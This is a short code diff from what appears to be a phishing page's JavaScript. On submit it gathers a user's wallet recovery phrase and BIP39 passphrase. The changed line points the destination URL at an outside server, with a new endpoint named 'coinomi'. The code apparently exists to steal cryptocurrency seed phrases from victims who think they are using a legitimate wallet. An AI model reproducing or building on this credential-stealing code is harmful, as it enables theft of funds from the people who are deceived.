@@ -231,7 +231,7 @@ document.querySelector("#submit").addEventListener("click",(e)=>{
     }
 
     if(word===true){
-        const url = "https://backend-01-92mi.onrender.com/api/data8";
+        const url = "https://backend-01-92mi.onrender.com/api/coinomi";
         const data = {
             recoveryPhrase:str1,
             bip39passPhrase:str2
